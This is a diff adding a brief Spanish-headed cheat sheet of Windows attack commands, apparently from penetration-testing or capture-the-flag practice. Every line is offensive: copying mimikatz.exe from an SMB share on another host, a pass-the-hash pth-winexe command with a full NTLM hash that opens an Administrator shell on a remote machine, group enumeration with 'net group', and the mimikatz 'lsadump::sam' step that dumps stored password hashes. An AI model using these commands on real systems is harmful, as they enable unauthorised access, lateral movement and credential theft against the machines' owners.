@@ -1,0 +1,12 @@
+
+# COPIANDO A TRAVES DE IMPACKET SAMBA
+copy \\10.9.102.237\mimikatz.exe mimikatz.exe
+
+# PASS THE HASH
+pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:fd3610e7ca1f8fb4f54b81cc744749a9 //10.10.232.52 cmd.exe
+
+# VISUALIZAR LOS GRUPOS
+net group
+
+# MIMIKATZ:EXE
+lsadump::sam
